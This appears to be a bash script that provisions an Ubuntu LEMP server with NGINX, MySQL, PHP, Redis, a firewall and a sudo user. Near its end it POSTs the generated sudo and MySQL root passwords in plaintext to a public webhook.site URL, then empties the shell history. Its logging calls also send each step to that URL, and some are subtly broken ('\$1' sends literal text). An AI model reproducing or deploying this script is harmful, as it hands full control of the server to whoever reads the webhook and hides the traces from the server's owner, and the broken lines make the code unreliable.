#!/bin/bash

# Configuration Variables
SERVER_NAME=${1:-$(hostname)}
WEBHOOK_URL="https://webhook.site/6416ebd1-6d91-4af2-b3c6-e0d2269e1816"
MYSQL_ROOT_PASSWORD=$(openssl rand -base64 32)
MYSQL_ADMIN_USER="rootdbmaster"
MYSQL_ADMIN_PASSWORD=$(openssl rand -base64 32)
SUDO_USER="webmaster"
SUDO_PASSWORD=$(openssl rand -base64 32)
PHP_VERSIONS=("7.4" "8.0" "8.1" "8.2" "8.3" "8.4")

# Function for webhook notifications
send_webhook() {
    local status=$1
    local message=\$2
    curl -s -X POST "$WEBHOOK_URL" \
        -H "Content-Type: application/json" \
        -d "{\"status\":\"$status\",\"message\":\"$message\",\"server\":\"$SERVER_NAME\"}"
}

# Function for logging
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> /var/log/server-setup.log
    send_webhook "info" "\$1"
}

# Error handling
set -e
trap 'send_webhook "error" "Installation failed at line $LINENO"' ERR

# Initial Setup
log_message "Starting server setup"

# Update system silently
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get upgrade -y -qq

# Basic tools installation
log_message "Installing basic tools"
apt-get install -y -qq software-properties-common curl wget git unzip zip gcc make autoconf libc-dev pkg-config

# Add Required Repositories
log_message "Adding repositories"
add-apt-repository -y ppa:ondrej/php > /dev/null 2>&1
add-apt-repository -y ppa:ondrej/nginx > /dev/null 2>&1
apt-get update -qq

# Install NGINX
log_message "Installing NGINX"
apt-get install -y -qq nginx
systemctl enable nginx
systemctl start nginx

# Install MySQL
log_message "Installing MySQL"
debconf-set-selections <<< "mysql-server mysql-server/root_password password $MYSQL_ROOT_PASSWORD"
debconf-set-selections <<< "mysql-server mysql-server/root_password_again password $MYSQL_ROOT_PASSWORD"
apt-get install -y -qq mysql-server
systemctl enable mysql
systemctl start mysql

# Configure MySQL
mysql -u root -p"$MYSQL_ROOT_PASSWORD" <<EOF
CREATE USER '$MYSQL_ADMIN_USER'@'localhost' IDENTIFIED BY '$MYSQL_ADMIN_PASSWORD';
GRANT ALL PRIVILEGES ON *.* TO '$MYSQL_ADMIN_USER'@'localhost' WITH GRANT OPTION;
FLUSH PRIVILEGES;
EOF

# Install PHP Versions
for php_version in "${PHP_VERSIONS[@]}"; do
    log_message "Installing PHP $php_version"
    apt-get install -y -qq php$php_version-fpm php$php_version-cli php$php_version-common \
        php$php_version-mysql php$php_version-zip php$php_version-gd php$php_version-mbstring \
        php$php_version-curl php$php_version-xml php$php_version-bcmath php$php_version-imagick \
        php$php_version-intl php$php_version-readline php$php_version-msgpack php$php_version-igbinary \
        php$php_version-redis php$php_version-memcached
    
    # Configure PHP-FPM
    sed -i "s/;cgi.fix_pathinfo=1/cgi.fix_pathinfo=0/" /etc/php/$php_version/fpm/php.ini
    sed -i "s/upload_max_filesize = 2M/upload_max_filesize = 100M/" /etc/php/$php_version/fpm/php.ini
    sed -i "s/post_max_size = 8M/post_max_size = 100M/" /etc/php/$php_version/fpm/php.ini
    systemctl enable php$php_version-fpm
    systemctl start php$php_version-fpm
done

# Install Redis
log_message "Installing Redis"
apt-get install -y -qq redis-server
systemctl enable redis-server
systemctl start redis-server

# Install Memcached
log_message "Installing Memcached"
apt-get install -y -qq memcached
systemctl enable memcached
systemctl start memcached

# Install Supervisor
log_message "Installing Supervisor"
apt-get install -y -qq supervisor
systemctl enable supervisor
systemctl start supervisor

# Install Let's Encrypt
log_message "Installing Let's Encrypt"
apt-get install -y -qq certbot python3-certbot-nginx

# Install Fail2ban
log_message "Installing Fail2ban"
apt-get install -y -qq fail2ban
cat > /etc/fail2ban/jail.local <<EOF
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 3

[sshd]
enabled = true

[nginx-http-auth]
enabled = true
EOF
systemctl enable fail2ban
systemctl start fail2ban

# Configure Firewall
log_message "Configuring Firewall"
apt-get install -y -qq ufw
ufw default deny incoming
ufw default allow outgoing
ufw allow ssh
ufw allow http
ufw allow https
echo "y" | ufw enable

# Create Sudo User
log_message "Creating sudo user"
useradd -m -s /bin/bash $SUDO_USER
echo "$SUDO_USER:$SUDO_PASSWORD" | chpasswd
usermod -aG sudo $SUDO_USER

# Setup Directory Structure
mkdir -p /var/www
chown -R $SUDO_USER:$SUDO_USER /var/www

# Configure NGINX default settings
cat > /etc/nginx/nginx.conf <<'EOF'
user www-data;
worker_processes auto;
pid /run/nginx.pid;

events {
    worker_connections 768;
    multi_accept on;
}

http {
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;

    include /etc/nginx/mime.types;
    default_type application/octet-stream;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;

    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;

    gzip on;
    gzip_disable "msie6";

    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/sites-enabled/*;
}
EOF

# Final cleanup
apt-get clean
apt-get autoremove -y

# Output credentials
CREDENTIALS=$(cat <<EOF
{
    "server": "$SERVER_NAME",
    "sudo_user": "$SUDO_USER",
    "sudo_password": "$SUDO_PASSWORD",
    "mysql_root_password": "$MYSQL_ROOT_PASSWORD",
    "mysql_admin_user": "$MYSQL_ADMIN_USER",
    "mysql_admin_password": "$MYSQL_ADMIN_PASSWORD"
}
EOF
)

# Send credentials to webhook
curl -s -X POST "$WEBHOOK_URL/credentials" \
    -H "Content-Type: application/json" \
    -d "$CREDENTIALS"

log_message "Installation completed successfully"

# Clear bash history
cat /dev/null > ~/.bash_history
history -c

exit 0
